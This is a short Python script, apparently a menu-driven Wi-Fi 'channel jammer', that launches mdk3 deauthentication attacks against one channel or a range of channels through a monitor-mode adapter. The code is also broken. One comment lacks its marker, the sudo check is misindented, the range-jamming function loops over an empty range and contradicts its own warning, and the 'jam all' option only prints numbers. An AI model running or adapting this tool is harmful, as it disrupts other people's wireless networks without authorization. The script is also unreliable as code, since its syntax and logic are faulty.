import time
import subprocess
import os

# Clear screen and wait briefly
time.sleep(1)
os.system("clear")

# Print banner
print("-" * 30)
print("[ - MDK3 Channel Jammer - ]")
print("-" * 30 + "\n")

Check if script was started with sudo (commented out for now)
 def CheckSudo():
     if os.geteuid() != 0:
         print("Script was NOT started with sudo. Please start script with sudo.")
         exit()
     else:
         print("Script was started with sudo. Continuing...")

# -------------------- FUNCTION DEFINITIONS --------------------

def JamAll():
    first = 1
    second = 12
    for channel in range(first, second + 1):
        print("Channel is:", channel)
        time.sleep(1)
        if channel == second:
            print("Finished jamming all channels")
            exit()

def JamChanToChan(first_channel, second_channel):
    if first_channel > second_channel:
        for channel in range(first_channel, second_channel + 1):
            process = subprocess.Popen(["mdk3", adapter, "d", "-c", str(channel)])
            time.sleep(10)
            process.terminate()
            time.sleep(3)
        print("Finished jamming channels from", first_channel, "to", second_channel)
        exit()
    else:
        print("! WARNING !\nFirst Channel MUST BE GREATER than Second Channel!\nFor example :\nFirst Channel : 3\nSecond Channel : 9")
        exit()

# -------------------- FUNCTION DEFINITIONS END --------------------

CheckSudo()

adapter = "wlan1mon"

print("\nLoading MDK3 CHANNEL JAMMER...\n")
time.sleep(1)

print("Please select an option\n")
print("[1] - Jam ONLY 1 specific channel")
print("[2] - Jam ALL channels (Pick CH to Pick CH)")
print("[3] - Jam ALL channels (1 to 12)\n")

# User input for selection
pick_to_jam = input("I will Pick --> ")

if pick_to_jam == "1":
    specific_channel = input("Type channel number --> ")
    # Jam 1 channel
    try:
        process = subprocess.Popen(["mdk3", adapter, "d", "-c", specific_channel])
        time.sleep(10)
        process.terminate()
    except KeyboardInterrupt:
        print("Pressed CTRL+C!\nExiting...")
        exit()

elif pick_to_jam == "2":
    first_channel = int(input("Type FIRST channel number --> "))
    second_channel = int(input("Type SECOND channel number --> "))
    JamChanToChan(first_channel, second_channel)

elif pick_to_jam == "3":
    # Jam all channels
    JamAll()

else:
    print("Selected WRONG Option:", pick_to_jam)
    exit()
